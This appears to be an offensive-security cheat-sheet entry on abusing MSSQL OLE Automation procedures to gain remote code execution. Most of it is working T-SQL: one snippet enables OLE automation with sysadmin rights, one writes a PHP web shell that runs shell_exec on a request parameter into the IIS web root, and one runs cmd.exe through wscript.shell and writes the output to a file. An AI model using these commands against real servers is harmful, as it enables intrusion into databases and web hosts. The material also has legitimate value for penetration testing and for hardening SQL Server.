It is possible to abuse of OLE Automation in order to gain *RCE(Remote Code Execution)* capabilities from MSSQL database.

## What are OLEs?
[OLE Automation](https://learn.microsoft.com/en-us/cpp/mfc/automation?view=msvc-170) is an inter-process communication mechanism developed by `Microsoft` which essentially allows us to use other languages such as `VBScript` from a `T-SQL` query. To do so, we need to make use of the [sp_OACreate](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql?view=sql-server-ver16) and [sp_OAMethod](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oamethod-transact-sql?view=sql-server-ver16) stored procedures.

## Attack
By default OLE procedure is *disabled* but in case we have SA we can easily enable them.
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'ole automation procedures', 1;
RECONFIGURE;
```
From here now we can inject a PHP web-shell to the local IIS server and gain rce!
```SQL
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
We can also pipe out the result of commands to text files instead(**less effective**). In this example the verbose is piped out to `C:\Windows\Tasks\tmp.txt`
```sql
DECLARE @objShell INT;
DECLARE @output varchar(8000);

EXEC @output = sp_OACreate 'wscript.shell', @objShell Output;
EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';
```